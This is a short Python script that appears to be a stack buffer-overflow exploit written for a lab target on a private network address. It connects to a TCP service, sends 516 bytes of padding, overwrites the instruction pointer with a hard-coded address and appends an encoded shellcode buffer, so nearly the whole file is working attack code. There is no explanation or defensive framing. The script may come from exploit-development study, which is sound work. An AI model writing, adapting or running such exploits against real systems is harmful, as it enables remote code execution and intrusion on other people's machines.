import socket

#I finally got the server to work, so I can now test this


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#info of host
host = "192.168.195.237" #remember to change again before running
port = 8421

sock.connect((host, port))

#receive initial welcome message
response = sock.recv(2048)
print(response.decode())

#try giving input of a specific length to have only BBBB in EIP
length = 516
padding = b"A"*length
#"\x76\xF2\x3C\xA6" but reversed
eipOverwrite = b"\xA6\x3C\xF2\x76"	#"\x76\xF2\x3C\xA6"

#exploit buffer
buf =  b""
buf += b"\xd9\xea\xd9\x74\x24\xf4\xba\x88\x41\x9d\x4a\x5f"
buf += b"\x31\xc9\xb1\x59\x31\x57\x19\x83\xef\xfc\x03\x57"
buf += b"\x15\x6a\xb4\x61\xa2\xe5\x37\x9a\x33\x99\x06\x48"
buf += b"\xba\xbc\x0d\xe7\xef\x0e\x45\xa5\x03\xe5\x0b\x5e"
buf += b"\x97\x8b\x83\x6f\x58\x64\x63\xc5\x80\x4b\x4b\x76"
buf += b"\xf0\xca\x37\x85\x25\x2c\x09\x46\x38\x2d\x4e\x10"
buf += b"\x36\xc2\x02\xf4\x33\x4e\xb3\x71\x01\x52\xb2\x55"
buf += b"\x0d\xea\xcc\xd0\xd2\x9e\x60\xda\x02\xd5\x21\xfc"
buf += b"\xa3\x3a\x5a\xb4\xbb\xec\xd8\x8c\xc8\x30\xaa\x85"
buf += b"\x05\xc3\x1d\x65\x64\x05\x6c\x59\xcb\x68\x40\x54"
buf += b"\x15\xad\x67\x87\x60\xc5\x9b\x3a\x73\x1e\xe1\xe0"
buf += b"\xf6\x80\x41\x62\xa0\x64\x73\xa7\x37\xef\x7f\x0c"
buf += b"\x33\xb7\x63\x93\x90\xcc\x98\x18\x17\x02\x29\x5a"
buf += b"\x3c\x86\x71\x38\x5d\x9f\xdf\xef\x62\xff\xb8\x50"
buf += b"\xc7\x74\x2a\x86\x77\x75\xb4\xa7\x25\xe1\x78\x6a"
buf += b"\xd6\xf1\x16\xfd\xa5\xc3\xb9\x55\x22\x6f\x31\x70"
buf += b"\xb5\xe6\x55\x83\x69\x40\x35\x7d\x8a\xb0\x1f\xba"
buf += b"\xde\xe0\x37\x6b\x5f\x6b\xc8\x94\x8a\x01\xc2\x02"
buf += b"\xf5\x7d\x1f\xa8\x9d\x7f\xa0\x6a\x51\xf6\x46\x24"
buf += b"\x3d\x58\xd7\x85\xed\x18\x87\x6d\xe4\x97\xf8\x8e"
buf += b"\x07\x72\x91\x25\xe8\x2a\xc9\xd1\x91\x77\x81\x40"
buf += b"\x5d\xa2\xef\x43\xd5\x46\x0f\x0d\x1e\x23\x03\x7a"
buf += b"\x79\xcb\xdb\x7b\xec\xcb\xb1\x7f\xa6\x9c\x2d\x82"
buf += b"\x9f\xea\xf1\x7d\xca\x69\xf5\x82\x8b\x5b\x8d\xb5"
buf += b"\x19\xe3\xf9\xb9\xcd\xe3\xf9\xef\x87\xe3\x91\x57"
buf += b"\xfc\xb0\x84\x97\x29\xa5\x14\x02\xd2\x9f\xc9\x85"
buf += b"\xba\x1d\x37\xe1\x64\xde\x12\x71\x62\x20\xe0\x5e"
buf += b"\xcb\x48\x1a\xdf\xeb\x88\x70\xdf\xbb\xe0\x8f\xf0"
buf += b"\x34\xc0\x70\xdb\x1c\x48\xfa\x8a\xef\xe9\xfb\x86"
buf += b"\xae\xb7\xfc\x25\x6b\x48\x86\x46\x8c\xa9\x77\x4f"
buf += b"\xe9\xaa\x77\x6f\x0f\x97\xa1\x56\x65\xd6\x71\xed"
buf += b"\x76\x6d\xd7\x44\x1d\x8d\x4b\x96\x34"


payload = padding + eipOverwrite + buf

print("Sending Payload")

sock.send(payload)

#Should not run unless exploit fails
response = sock.recv(2048)
print(response.decode())
